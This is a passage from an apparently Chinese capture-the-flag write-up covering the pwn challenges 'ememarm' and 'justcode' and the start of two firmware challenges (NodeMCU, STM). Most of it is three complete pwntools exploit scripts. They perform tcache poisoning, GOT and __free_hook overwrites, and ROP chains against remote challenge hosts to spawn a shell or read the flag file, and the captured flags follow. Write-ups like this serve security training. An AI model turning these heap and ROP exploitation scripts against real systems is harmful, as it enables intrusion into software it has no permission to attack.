0x30 堆分别布置到 0x4132e0 和 0x413320 ，都加入链表。前一个堆被溢出后执行自身的 fd_nextsize 位置，同时这个位置被视为 0x20 堆块放入 tcachebin 。利用 edit 修改 tcachebin fd 实现 house of sprit</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210203220806.png" alt="image-20210203220806048"></p><p>由于题目给的 libc 文件没有 debug 信息，所以 gdb 的 heap 和 bin 指令是不能用的。heap 指令用直接查地址代替，地址可以在 vmmap 看。tcache bin 可以查 heap 分段开始 0x250 的结构体。</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;ememarm&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;183.129.189.60&#x27;</span>, <span class="number">10034</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;ememarm&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;ememarm&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;ememarm&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_1</span>(<span class="params">x, y, add</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;cx:&#x27;</span>, x)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;cy:&#x27;</span>, y)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete?&#x27;</span>, <span class="built_in">str</span>(add))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_2</span>(<span class="params">x, y, add</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;cx:&#x27;</span>, x)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;cy:&#x27;</span>, y)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete?&#x27;</span>, <span class="built_in">str</span>(add))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">pos, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: \n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(pos))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;~~&quot;</span>)</span><br><span class="line">bss_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="number">1</span>))</span><br><span class="line">log.info(<span class="string">&quot;bss_addr:&quot;</span>+<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">p.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># prt=0x413250</span></span><br><span class="line">add_1(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">add_1(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">add_2(<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">add_2(<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, flat(<span class="number">0</span>, <span class="number">0x31</span>, <span class="number">0</span>))<span class="comment">#free fake_chunk</span></span><br><span class="line">edit(<span class="number">1</span>, flat(<span class="number">0</span>, <span class="number">0x31</span>, elf.got[<span class="string">&#x27;free&#x27;</span>]-<span class="number">8</span>))<span class="comment"># overwrite tcache fd</span></span><br><span class="line"></span><br><span class="line">add_1(<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># allocate chunk in got </span></span><br><span class="line">add_1(p8(<span class="number">0x40</span>), p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]), <span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">3</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))+<span class="number">0x4000000000</span></span><br><span class="line">log.info(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base)) <span class="comment"># 0x400086f2c8</span></span><br><span class="line"></span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;183.129.189.60&#x27;</span>, <span class="number">10034</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;ememarm&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;ememarm&quot;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;~~&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_1(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">add_1(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">add_2(<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">add_2(<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, flat(<span class="number">0</span>, <span class="number">0x31</span>, <span class="number">0</span>))<span class="comment">#free fake_chunk</span></span><br><span class="line">edit(<span class="number">1</span>, flat(<span class="number">0</span>, <span class="number">0x31</span>, libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment"># overwrite tcache fd</span></span><br><span class="line"></span><br><span class="line">add_1(<span class="string">&#x27;/bin/sh\x00&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># allocate chunk in got </span></span><br><span class="line">add_1(p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]),<span class="string">&#x27;\x00&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>flag{1f16c67b554e9e75300f37e9f08d0aa4}</p></blockquote><h3 id="justcode"><a href="#justcode" class="headerlink" title="justcode"></a>justcode</h3><h4 id="基本情况-2"><a href="#基本情况-2" class="headerlink" title="基本情况"></a>基本情况</h4><p>Amd64 开启沙盒禁用 execve </p><p>直接审代码就 name 写入时能够溢出修改 canary ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210204152423.png" alt="image-20210204152423664"></p><p>因为没有置零栈区再使用，在写入 name 时可以泄露出站上的 libc 地址：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210204153423.png" alt="image-20210204153422944"></p><p>另外一个问题得细心调试才观察出来，也是因为栈上的数据没有经过置零后再使用，导致在输入 name 时，可以控制  sub_400CCA() 的写入地址 v1 ，实现<strong>任意地址写</strong>。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210204153028.png" alt="image-20210204153028209"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210204153736.png" alt="image-20210204153736391"></p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p><code>sub_400C47()</code> 泄露出 libc 地址；<code>sub_400C47()</code> 写入目标地址，<code>sub_400CCA()</code> 向目标地址写入值，修改 exit 为 main 突破操作 4 次的限制；</p><p>将 rop 利用链通过 name 写入栈上，将 strdup 劫持为 gadget <code>add rsp 8;ret</code> ，将程序流 hijack 到栈上。也可以控制寄存器用 <code>sub_400CCA()</code> scanf 往 bss 写入利用链，控制 rbp、rip 栈迁移。</p><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary=<span class="string">&quot;justcode&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./justcode&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;183.129.189.60&quot;</span>,<span class="number">10041</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./justcode&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="comment">#1 leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x7b60a</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#1 write v1 addr</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>+p64(elf.got[<span class="string">&#x27;exit&#x27;</span>]))</span><br><span class="line"><span class="comment">#2 overwrite exit</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;id:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x400D4B</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">main_addr=<span class="number">0x400D76</span></span><br><span class="line">rop_addr=<span class="number">0x6020e0</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x21112</span>+libc_base</span><br><span class="line">pop_rsi_ret=<span class="number">0x202f8</span>+libc_base</span><br><span class="line">pop_rdx_ret=<span class="number">0x1b92</span>+libc_base</span><br><span class="line">add_rsp8_ret=<span class="number">0x35142</span>+libc_base</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;code:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1 leak stack addr</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main_ret_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;main_ret_addr:&quot;</span>+<span class="built_in">hex</span>(main_ret_addr))</span><br><span class="line">flag_addr=main_ret_addr-<span class="number">0x80</span>-<span class="number">0x28</span><span class="comment">#0x9e</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># open(&amp;flag,0,0)</span></span><br><span class="line">rop=p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_ret)+p64(<span class="number">0</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line"><span class="comment"># read(3,bss_addr,0x40)</span></span><br><span class="line">rop+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(bss_addr)+p64(pop_rdx_ret)+p64(<span class="number">0x40</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># puts(bss_addr)</span></span><br><span class="line">rop+=p64(pop_rdi_ret)+p64(bss_addr)+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+<span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;code:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1 write v1 addr</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>+p64(elf.got[<span class="string">&#x27;strdup&#x27;</span>]))</span><br><span class="line"><span class="comment">#2 overwrite strdup</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;id:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(add_rsp8_ret&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#1 write rop &amp; getshell</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">p.send(rop)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&quot;./justcode&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;183.129.189.60&quot;</span>,<span class="number">10041</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;justcode&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line">main = <span class="number">0x400D4B</span></span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;check it : aaaaaaaa&quot;</span>)</span><br><span class="line">addr = u64(sh.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;addr:&#x27;</span>+<span class="built_in">hex</span>(addr)</span><br><span class="line">libc_base = addr - <span class="number">0x7b61e</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;a&quot;</span>*<span class="number">0xc</span>+p64(elf.got[<span class="string">&#x27;exit&#x27;</span>]))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(main))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;info:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret = <span class="number">0x0000000000021112</span>+libc_base</span><br><span class="line">rsi_ret = <span class="number">0x00000000000202f8</span>+libc_base</span><br><span class="line">rdx_ret = <span class="number">0x0000000000001b92</span>+libc_base</span><br><span class="line">rbp_ret = <span class="number">0x000000000001f930</span>+libc_base</span><br><span class="line">rdx_rsi_ret = <span class="number">0x0000000000115189</span>+libc_base</span><br><span class="line">leave_ret = <span class="number">0x0000000000042361</span>+libc_base</span><br><span class="line">sh.recvuntil(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;z&quot;</span>*<span class="number">0xc</span>+p64(elf.got[<span class="string">&#x27;exit&#x27;</span>])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="number">0x400CF6</span>))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;info:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;no check&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x21</span></span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x200</span>)</span><br><span class="line">payload += p64(<span class="number">0x6020A0</span>+<span class="number">0x200</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload += p64(rbp_ret)</span><br><span class="line">payload += p64(<span class="number">0x6020A0</span>+<span class="number">0x200</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(<span class="number">0x6020A0</span>+<span class="number">0x200</span>)</span><br><span class="line">payload += p64(rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;open&#x27;</span>]+libc_base)</span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x6020A0</span>+<span class="number">0x300</span>)</span><br><span class="line">payload += p64(rdx_ret)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x6020A0</span>+<span class="number">0x300</span>)</span><br><span class="line">payload += p64(rdx_ret)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;write&#x27;</span>]+libc_base)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>flag{f79047efe49d10a8001c5791c34f0dbb}</p></blockquote><h2 id="固件安全"><a href="#固件安全" class="headerlink" title="固件安全"></a>固件安全</h2><h3 id="NodeMCU"><a href="#NodeMCU" class="headerlink" title="NodeMCU"></a>NodeMCU</h3><p><del>妙用strings</del>固件分析 <code>strings nodemcu.bin</code> :</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202220817.png" alt="image-20210202220817250"></p><blockquote><p>flag{6808dcf0-526e-11eb-92de-acde48001122}</p></blockquote><h3 id="STM"><a href="#STM" class="headerlink" title="STM"></a>STM</h3><p>解压得到 <code>.bin</code> 后缀文件，推测应该是 STM 固件分析题目。一番学习后，bin 文件可以转换为 hex 文件再丢 ida 里面分析，当然也可以直接丢 bin 文件分析，两者差别在加载是是否需要手动调加载地址。实际上 hex 文件自动加载地址是从 0x0 开始，也是不对，所以还是直接丢 bin 文件分析。</p><p>Ida32 打开，文件加载选项如下图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202202217.png" alt="image-20210202202209959"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202211323.png" alt="image-20210202211323645"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202222010.png"></p><p>按照上图设置完成后，一路 ok 返回加载 bin 文件，这是会有一个弹窗设置 ram rom 的地址，如果加载的是 hex 则没有这个窗口：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202221948.png"></p><p>RAM start address：ram 起始地址，stm32 是0x20000000</p><p>RAM size：ram 长度， 64kb 内存是 0x10000</p><p>ROM start address：rom 起始地址，一般是 0x08000000 ，一开始是 0x08000101 加载出来不正确。</p><p>ROM size：rom 长度</p><p>Loading address：rom 装载地址</p><p>在文件开头疯狂按 d 调整数据格式，显示出程序入口 <code>0x8000101</code> ：</p><p><img src= 